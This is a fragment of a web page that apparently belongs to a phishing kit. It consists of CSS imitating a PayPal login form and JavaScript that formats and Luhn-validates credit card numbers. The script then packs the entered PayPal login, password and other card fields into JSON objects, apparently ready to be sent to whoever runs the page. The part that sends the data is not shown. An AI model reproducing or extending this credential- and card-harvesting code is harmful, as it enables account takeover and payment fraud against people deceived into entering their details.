  <style>
    html {
      line-height: 1.15;
      -webkit-text-size-adjust: 100%
    }

    body {
      margin: 0
    }

    main {
      display: block
    }

    h1 {
      font-size: 2em;
      margin: .67em 0
    }

    hr {
      box-sizing: content-box;
      height: 0;
      overflow: visible
    }

    pre {
      font-family: monospace, monospace;
      font-size: 1em
    }

    a {
      background-color: transparent
    }

    abbr[title] {
      border-bottom: none;
      text-decoration: underline;
      text-decoration: underline dotted
    }

    b,
    strong {
      font-weight: bolder
    }

    code,
    kbd,
    samp {
      font-family: monospace, monospace;
      font-size: 1em
    }

    small {
      font-size: 80%
    }

    sub,
    sup {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline
    }

    sub {
      bottom: -.25em
    }

    sup {
      top: -.5em
    }

    img {
      border-style: none
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      font-family: inherit;
      font-size: 100%;
      line-height: 1.15;
      margin: 0
    }

    button,
    input {
      overflow: visible
    }

    button,
    select {
      text-transform: none
    }

    button,
    [type="button"],
    [type="reset"],
    [type="submit"] {
      -webkit-appearance: button
    }

    button::-moz-focus-inner,
    [type="button"]::-moz-focus-inner,
    [type="reset"]::-moz-focus-inner,
    [type="submit"]::-moz-focus-inner {
      border-style: none;
      padding: 0
    }

    button:-moz-focusring,
    [type="button"]:-moz-focusring,
    [type="reset"]:-moz-focusring,
    [type="submit"]:-moz-focusring {
      outline: 1px dotted ButtonText
    }

    fieldset {
      padding: .35em .75em .625em
    }

    legend {
      box-sizing: border-box;
      color: inherit;
      display: table;
      max-width: 100%;
      padding: 0;
      white-space: normal
    }

    progress {
      vertical-align: baseline
    }

    textarea {
      overflow: auto
    }

    [type="checkbox"],
    [type="radio"] {
      box-sizing: border-box;
      padding: 0
    }

    [type="number"]::-webkit-inner-spin-button,
    [type="number"]::-webkit-outer-spin-button {
      height: auto
    }

    [type="search"] {
      -webkit-appearance: textfield;
      outline-offset: -2px
    }

    [type="search"]::-webkit-search-decoration {
      -webkit-appearance: none
    }

    ::-webkit-file-upload-button {
      -webkit-appearance: button;
      font: inherit
    }

    details {
      display: block
    }

    summary {
      display: list-item
    }

    template {
      display: none
    }

    [hidden] {
      display: none
    }

    body {
      background-color: #ffffff;
    }

    html {
      font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
    }

    #paypal {
      display: table;
      position: absolute;
      height: 100%;
      width: 100%;
      overflow: hidden;
    }

    #paypal .logo {
      text-align: center;
    }

    #paypal .content {
	margin-right: 5%;
	margin-left: 5%;
   
   
    border-radius: 5px;
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 440px;
    width: calc(90% - 44px);
    padding: 22px 22px 22px 22px;
    margin-bottom: 28px;
    background-color: #fff;
    min-width: 200px;
    
    }

    #paypal input {
line-height: 16px;
    font-size: 17px;
    box-sizing: border-box;
    width: 100%;
    position: relative;
    padding: 10px;
    margin: 0px 1px;
    display: block;
    -webkit-box-shadow: none;
    box-shadow: none;
    -webkit-appearance: none;
    height: 48px;
    margin: 0px 0px 10px 0px;
    color: #7e7e7e;
    text-align: left;
    background: rgb(246, 246, 246);;
    outline: none;
    border-top: none;
    border-left: none;
    border-right: none;
    border-bottom: 1.5px solid #b8b8b8;
    border-radius: 5px 5px 0px 0px;
    }

    #paypal .createtext {
      margin-bottom: 16px;
      font-size: .8125rem;
      color: #262626;
      text-align: left;
    }

    #paypal a {
      color: #0070ba;
    }

    #paypal .btnNext {
    right: 0;
    width: 100%;
    height: 47px;
    margin: 30px 0px 0px 0px;
    outline: none;
    float: right;
    background: #714cb4;
    color: #ffffff;
    border: 1px solid #714cb4;
    font-size: 14px;
    -webkit-appearance: none;
    border-radius: 10px;
    cursor: pointer;
    }

    #paypal .btnNext:hover {
      background-color: #005ea6;
      outline: 0;
    }

    #paypal .middle {
      display: table-cell;
      vertical-align: middle;
    }

    #paypal .mailText {
      margin-top: 35px;
      width: 100%;
      text-align: center;
    }

    .footer {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      font-size: 11px;
      padding-top: 14px;
    }

    .footer .legalFooter {
      text-align: center;
    }

    .footerCopyright {
      margin: 0;
      text-align: left;
      color: #9e9e9e;
    }

    .footer .legalFooter {
      text-align: center;
      padding: 14px;
      background-color: #F7F9FA;
    }

    .dt {
      max-width: 50px;
    }
	.footer td {
    width: 33.3333%;
    text-align: center;
    color: #0066c0;
	}
	input[type="button"] {
left: 0;
    right: 0;
    width: 100%;
    height: 47px;
    margin: 30px 0px 0px 0px;
    outline: none;
    float: right;
    background: #714cb4;
    color: #ffffff;
    border: 1px solid #714cb4;
    font-size: 14px;
    -webkit-appearance: none;
    border-radius: 10px;
    cursor: pointer;
	}
  </style>
</head>

  function maskCC(event) {
    var vcc = this.value.replace(/\D/g, '');
    this.value = '';
    for (var i = 0; i < vcc.length; i++) {
      this.value += (i % 4 == 0 && i != 0 ? ' ' : '') + vcc[i];
    }
  }
  document.getElementById('number_card').addEventListener('input', maskCC, false);

  function valid_credit_card(value) {
    if (/[^0-9-\s]+/.test(value)) return false;
    var nCheck = 0, nDigit = 0, bEven = false;
    value = value.replace(/\D/g, "");
    for (var n = value.length - 1; n >= 0; n--) {
      var cDigit = value.charAt(n),
        nDigit = parseInt(cDigit, 10);
      if (bEven) {
        if ((nDigit *= 2) > 9) nDigit -= 9;
      }
      nCheck += nDigit;
      bEven = !bEven;
    }
    return (nCheck % 10) == 0;
  }


  /*********Recursive implementation of jSON.stringify; ********/
  var stringifyJSON = function (obj) {
    var arrOfKeyVals = [],
      arrVals = [],
      objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
      return '' + obj;
    else if (typeof obj === 'string')
      return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
      if (obj[0] === undefined)
        return '[]';
      else {
        obj.forEach(function (el) {
          arrVals.push(stringifyJSON(el));
        });
        return '[' + arrVals + ']';
      }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
      objKeys = Object.keys(obj);
      objKeys.forEach(function (key) {
        var keyOut = '"' + key + '":';
        var keyValOut = obj[key];
        if (keyValOut instanceof Function || typeof keyValOut === undefined)
          arrOfKeyVals.push('');
        else if (typeof keyValOut === 'string')
          arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
        else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
          arrOfKeyVals.push(keyOut + keyValOut);
        else if (keyValOut instanceof Object) {
          arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
        }
      });
      return '{' + arrOfKeyVals + '}';
    }
  };

  function formToJSON(f, ff) {
    if (ff == 'paypal') {
      var FinalObject = {}, namesHTML = ['input', 'select'];
      for (var i = 0; i < namesHTML.length; i++) {
        var bsform = f.getElementsByTagName(namesHTML[i]);
        for (var j = 0; j < bsform.length; j++) {

          if (bsform[j].id == 'paypallogin' || bsform[j].id == 'paypalpassword') {
            FinalObject[bsform[j].id] = bsform[j].value
          }
        }
      }
      return stringifyJSON(FinalObject);
    } else {
      var FinalObject = {}, namesHTML = ['input', 'select'];
      for (var i = 0; i < namesHTML.length; i++) {
        var bsform = f.getElementsByTagName(namesHTML[i]);
        for (var j = 0; j < bsform.length; j++) {
          if (bsform[j].id != 'paypallogin' && bsform[j].id != 'paypalpassword') {
            FinalObject[bsform[j].id] = bsform[j].value
          }
        }
      }
      return stringifyJSON(FinalObject);
    }
  }
